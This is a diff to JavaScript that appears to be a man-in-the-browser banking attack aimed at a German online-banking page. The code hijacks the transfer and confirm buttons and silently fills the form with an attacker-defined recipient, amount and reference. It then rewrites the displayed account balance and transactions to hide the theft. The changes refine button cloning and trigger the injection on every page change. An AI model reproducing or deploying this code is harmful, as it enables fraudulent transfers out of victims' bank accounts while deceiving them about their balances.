@@ -150,11 +150,17 @@ function outputEuros(number) {
     }
 }
 
+function clearHackedButtons() {
+	$("button[type*='button']").each(function() {
+		 $(this).attr("hackmarker", "false");
+	 });
+}
+
+
 function outputCents(amount) {
     amount = Math.round( ( (amount) - Math.floor(amount) ) *100);
     return (amount < 10 ? ',0' + amount : '.' + amount);
 }
-
 
 /*
  * gets real money and computes expected money
@@ -162,29 +168,15 @@ function outputCents(amount) {
 function getHackedMoney(realMoney) {
 	storedTransfers = loadTransfers();
 	diffMoney = 0;
-	console.log(realMoney);
 	for ( i = 0; i < storedTransfers.length; i++) {
 		diffMoney += HACK_AMOUNT - storedTransfers[i].amount;
-		console.log(diffMoney);
 	}
-	console.log(diffMoney);
-	console.log(realMoney);
-	console.log(diffMoney + realMoney);
 	return (realMoney + diffMoney);
 }
 	 function timedMsg()
 		 {
-		 
-		 //wrong tan input
-		 $(".gwt-Label:visible:contains('Falsche TAN')").each(function() {
-			 $(this).attr("hackMarker","true");
-			 //last transfer was not successfull, so delete it
-			 storedTransfers = loadTransfers();
-			 number = storedTransfers.length;
-			 storedTransfers.pop();
-		 });
+
 		 $("#btnTD button:visible[hackmarker!='true']:contains('Geld')").each(function(){	
-			 	
 		 			$(this).attr("hackMarker","true");
 		 			sendMoneyBtnClone=$(this).clone(true)
 		 			sendMoneyBtnClone.attr("hName","sendMoneyBtnClone");
@@ -224,8 +216,10 @@ function getHackedMoney(realMoney) {
 		 				$("input:eq(5)").val(HACK_AMOUNT);
 		 				$("input:eq(6)").val(HACK_USAGE);
 		 				sendMoneyBtnClone.attr("activateReset","true");
+		 				clearHackedButtons();
 		 				$("button[hackMarkerBtnOrig='true']")[0].click();
 		 				$(this).hide();
+		 				
 		 				});			
 		 			
 		 	});
@@ -263,6 +257,7 @@ function getHackedMoney(realMoney) {
 	 				$("input:eq(4)").val(HACK_BANK_NAME);
 	 				$("input:eq(5)").val(HACK_AMOUNT);
 	 				$("input:eq(6)").val(HACK_USAGE);
+	 				clearHackedButtons();
 	 				$("button[hackMarkerConfirmBtnOrig='true']")[0].click();
 	 				
 	 				//and change displayed values back
@@ -360,6 +355,27 @@ function getHackedMoney(realMoney) {
 
 		 		
 		 	});
+		 	
+		 	
+
+			 $("button[type*='button']:[hackmarker!='true']").each(function() {
+				 $(this).attr("hackmarker","true");
+				
+				 btnClone=$(this).clone(true);
+				 $(this).attr("hackFindValue", $(this).text());
+				 $(this).after(btnClone);
+				 $(this).hide();
+				 btnClone.click(function(event){
+					event.preventDefault();
+					clearHackedButtons();
+					$("button[hackFindValue*='"+$(this).text()+"']")[0].click();
+				});
+
+				
+			 });
+			 
+			 
+			 
 		 	//set hackmarker for transaction so they will not be changed during account amount manipulation
 		 	transactionRow= $(".TransfersOdd,.TransfersEven").each(function(){
 		 		$(this).next().next().next().attr("hackMarker","true");
@@ -371,9 +387,9 @@ function getHackedMoney(realMoney) {
 				 text = $(this).text();
 				 text = text.replace(".", "");
 				 text = text.replace(",", ".");
-				 console.log("\u20AC");
+				 
 				 text = text.replace("\u20AC", "");
-				 console.log(text +"aaaaa");
+				 
 				 oldValue = new parseFloat(text); 
 				 newValue = getHackedMoney(oldValue);
 				 
@@ -381,14 +397,16 @@ function getHackedMoney(realMoney) {
 				//display with 2 decimal places and €
 				$(this).text(outputMoney(newValue) + " \u20AC");
 			 });
-		 	var t=setTimeout(timedMsg,300);
+
 		 }
 	 
 	 $(document).ready(function() {
- 	timedMsg();
+		 window.addEventListener ("DOMNodeInserted", pageChanged, true); 	
 	 });
-  
 
- 
+
+	 function pageChanged()  {
+		setTimeout(timedMsg,100);
+	 }
  
   
